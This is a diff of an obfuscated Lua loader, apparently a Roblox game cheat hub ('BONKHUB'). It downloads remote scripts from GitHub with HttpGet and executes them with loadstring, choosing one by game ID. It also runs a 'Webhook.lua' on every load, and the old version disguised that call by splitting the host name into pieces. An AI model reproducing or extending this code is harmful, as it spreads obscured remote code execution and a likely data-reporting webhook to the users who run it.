@@ -21,8 +21,8 @@ function B_427(B_429)
     loadstring(B_429)()
 end
 
-function B_111(B_222)
-    B_427(B_107:HttpGet("https://raw.git"..B_222.."usercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/Webhook.lua"))()
+function B_111()
+    B_427(B_107:HttpGet("https://raw.githubusercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/Webhook.lua"))()
 end
 
 function B_100.OnInvoke(B_106)
@@ -50,8 +50,8 @@ local function B_104()
 end
 
 B_104()
-B_111("hub")
-
+B_111()
+print("loading")
 if B_426 == 1240123653 or string.find(B_425,"Zombie Attack") then -- Zombie Attack
     B_427(B_107:HttpGet("https://raw.githubusercontent.com/"..B_428.."/BONKHUB/main/"..B_430.."/ZombieAttack"..B_431))()
 elseif B_426 == 6938803436 or B_426 ~= 6938803436 and string.find(B_425,"Dimension") then -- Anime Dimension    
